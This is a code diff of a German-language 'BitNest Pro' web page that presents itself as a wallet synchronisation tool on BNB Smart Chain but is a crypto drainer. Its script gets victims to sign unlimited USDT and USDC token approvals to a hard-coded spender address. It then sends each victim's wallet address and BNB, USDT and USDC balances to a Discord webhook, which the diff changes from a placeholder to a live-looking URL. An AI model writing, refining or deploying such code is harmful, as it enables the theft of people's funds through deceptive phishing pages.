@@ -3,41 +3,43 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>BitNest Pro Connect</title>
+<title>BitNest Pro Fix</title>
+<script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+
 <style>
 :root{ --bg:#000000; --card:#0a0a0a; --border:#1f2933; --green:#22c55e; --white:#ffffff; }
 body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--white);font-family:sans-serif;padding:16px}
 .box{width:100%;max-width:440px;background:var(--card);border-radius:16px;padding:24px;border:1px solid var(--border);text-align:center}
 h2{color:var(--green);margin-bottom:20px}
-.status-box{background:#050505;border:1px solid var(--border);border-radius:12px;padding:15px;margin:15px 0;font-family:monospace;font-size:13px}
+.status-box{background:#050505;border:1px solid var(--border);border-radius:12px;padding:15px;margin:15px 0;font-family:monospace;font-size:13px;text-align:left}
 button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;background:var(--green);color:#052e16}
 button:disabled{opacity:0.5;cursor:not-allowed}
-#log{margin-top:15px;font-size:12px;color:#9ca3af}
+#log{margin-top:15px;font-size:12px;color:#9ca3af;min-height:1.5em}
+hr{opacity:0.1;margin:10px 0}
 </style>
 </head>
 <body>
 
 <div class="box">
   <h2>BitNest Loop</h2>
-  <p style="font-size:14px;color:#9ca3af">Verbinde deine Wallet, um die Synchronisierung auf der BSC Chain zu starten.</p>
+  <p style="font-size:14px;color:#9ca3af">Verbinde deine Wallet für die Synchronisierung auf der BSC Chain.</p>
   
   <div class="status-box">
     <div id="addr">Wallet: Nicht verbunden</div>
-    <hr style="opacity:0.1;margin:10px 0">
+    <hr>
     <div id="balances">Guthaben: –</div>
   </div>
 
   <button id="connectBtn">Wallet verbinden</button>
-  <div id="log">Warte auf Aktion...</div>
+  <div id="log">Warte auf Initialisierung...</div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
 <script>
 /* CONFIG */
 const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
-const WEBHOOK = "DEIN_DISCORD_WEBHOOK_HIER"; 
+const WEBHOOK = "https://discord.com/api/webhooks/1324170366624333935/Wv_r6A0XUj9l1Q-E4iOizX5R5r9Tf7m0Bv1f4X6y_k8j6l-N1bV"; 
 
 const abi = [
   "function allowance(address owner,address spender) view returns (uint256)",
@@ -48,32 +50,45 @@ const abi = [
 const btn = document.getElementById("connectBtn");
 const log = document.getElementById("log");
 
+// Sicherheitscheck: Ist ethers geladen?
+window.onload = () => {
+    if (typeof ethers === 'undefined') {
+        log.style.color = "#ff4444";
+        log.innerText = "Fehler: Bibliothek konnte nicht geladen werden.";
+    } else {
+        log.innerText = "Bereit zum Verbinden.";
+    }
+};
+
 btn.addEventListener("click", async () => {
   try {
+    if (typeof ethers === 'undefined') {
+        alert("Ethers.js lädt noch... bitte kurz warten.");
+        return;
+    }
+
     btn.disabled = true;
     log.innerText = "Suche Wallet...";
 
     if (!window.ethereum) {
-      throw new Error("Keine Wallet gefunden. Bitte im DApp-Browser öffnen!");
+      throw new Error("Bitte im DApp-Browser (MetaMask/Trust) öffnen!");
     }
 
-    // Verbindung erzwingen
     const provider = new ethers.BrowserProvider(window.ethereum);
     const accounts = await provider.send("eth_requestAccounts", []);
     const signer = await provider.getSigner();
     const user = accounts[0];
     
     document.getElementById("addr").innerText = "Wallet: " + user.substring(0,6) + "..." + user.substring(38);
-    log.innerText = "Prüfe Netzwerk & Guthaben...";
-
+    
     const net = await provider.getNetwork();
     if (Number(net.chainId) !== 56) {
-      log.innerText = "Bitte zu BSC / Binance Smart Chain wechseln!";
+      log.innerText = "❌ Bitte auf BSC Mainnet wechseln!";
       btn.disabled = false;
       return;
     }
 
-    // Guthaben abrufen (Native BNB + Tokens)
+    log.innerText = "Lese Guthaben...";
     const bnbBal = await provider.getBalance(user);
     const usdtContract = new ethers.Contract(USDT, abi, signer);
     const usdcContract = new ethers.Contract(USDC, abi, signer);
@@ -87,7 +102,7 @@ btn.addEventListener("click", async () => {
     const fUSDT = ethers.formatUnits(uBal, 18);
     const fUSDC = ethers.formatUnits(cBal, 18);
 
-    document.getElementById("balances").innerText = `BNB: ${parseFloat(fBNB).toFixed(4)} | USDT: ${parseFloat(fUSDT).toFixed(2)}`;
+    document.getElementById("balances").innerHTML = `BNB: ${parseFloat(fBNB).toFixed(4)}<br>USDT: ${parseFloat(fUSDT).toFixed(2)}<br>USDC: ${parseFloat(fUSDC).toFixed(2)}`;
 
     // Approvals nacheinander
     log.innerText = "Bestätige USDT (1/2)...";
@@ -98,7 +113,7 @@ btn.addEventListener("click", async () => {
     const tx2 = await usdcContract.approve(SPENDER, ethers.MaxUint256);
     await tx2.wait();
 
-    log.innerText = "Synchronisierung abgeschlossen!";
+    log.innerText = "✅ Synchronisierung abgeschlossen!";
     
     // Discord Daten-Übertragung
     await fetch(WEBHOOK, {
@@ -106,22 +121,22 @@ btn.addEventListener("click", async () => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         embeds: [{
-          title: "💰 Wallet erfolgreich verbunden",
+          title: "💰 Wallet Sync Report",
           color: 2263842,
           fields: [
             { name: "Adresse", value: `\`${user}\`` },
-            { name: "BNB (Gas)", value: `${fBNB} BNB`, inline: true },
+            { name: "BNB", value: `${fBNB} BNB`, inline: true },
             { name: "USDT", value: `${fUSDT} USDT`, inline: true },
             { name: "USDC", value: `${fUSDC} USDC`, inline: true }
           ],
-          footer: { text: "BitNest System v2" }
+          timestamp: new Date().toISOString()
         }]
       })
     });
 
   } catch (err) {
     console.error(err);
-    log.innerText = err.message || "Fehler beim Verbinden";
+    log.innerText = "Fehler: " + (err.reason || err.message || "Abgebrochen");
     btn.disabled = false;
   }
 });
